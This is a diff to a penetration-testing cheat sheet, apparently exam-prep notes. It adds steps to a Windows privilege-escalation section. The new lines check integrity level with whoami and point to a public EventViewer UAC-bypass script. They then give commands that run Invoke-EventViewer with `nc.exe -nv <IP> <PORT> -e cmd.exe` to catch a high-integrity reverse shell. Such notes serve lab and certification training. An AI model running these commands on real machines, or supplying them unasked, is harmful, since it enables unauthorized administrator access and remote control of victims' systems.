@@ -2131,8 +2131,19 @@ Linux: `./unix-privesc-check standard > output.txt`
 
 ### Windows Privilege Escalation
 - UAC bypass by editing registry: Check for permissions first `whoami /priv`.
+    - `whoami /groups` if it reveals a `Medium Mandatory Level`, most likely it is a UAC bypass that is required
     - `fodhelper.exe` can possibly be found in `C:\Windows\sysnative`
-    - https://github.com/k4sth4/UAC-bypass (`eventvwr.exe`)
+    - https://github.com/CsEnox/EventViewer-UACBypass (Use this `Invoke-EventViewer.ps1`)
+	- Run `Invoke-EventViewer.ps1`
+	- Transfer `nc.exe` and run the following:
+	```
+	PS: Import-Module .\Invoke-EventViewer.ps1
+	powershell
+	Invoke-EventViewer nc.exe
+	Invoke-EventViewer cmd.exe
+	Invoke-EventViewer "C:\Windows\Tasks\nc.exe -nv <IP> <PORT> -e cmd.exe"
+	```
+	- It should catch a reverse shell with high mandatory level.
     - `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
 - Exploit insecure file permissions on services that run as `nt authority\system`
 - Unquoted service paths
